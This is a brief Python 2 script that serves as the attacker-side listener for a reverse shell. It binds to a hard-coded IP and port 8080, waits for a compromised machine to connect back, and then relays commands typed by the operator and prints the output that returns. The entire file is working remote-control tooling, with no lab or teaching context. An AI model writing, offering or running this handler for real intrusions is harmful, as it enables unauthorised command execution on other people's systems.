#!/usr/bin/python
import socket

host = '10.174.15.32'             # IP address of server, change as required
port = 8080                       # Port number
reverse_shell = socket.socket()   # Create socket

reverse_shell.bind((host, port))  # Bind the socket to 10.174.15.32
reverse_shell.listen(1)           # Listen on port 8080

print("Awaiting connection.......")

# Infinite while loop
while True:
    conn, address = reverse_shell.accept() # conn the socket object to send and receive data on the connection,
                                           # address is the address bound to the socket on the other end of the connection
    
    print ("Accepted connection from", address)
    
    while True:
        cmd = raw_input("> ")
        conn.send(cmd)                     # Send a command i.e 'dir'
        print conn.recv(1024)              # Output 
        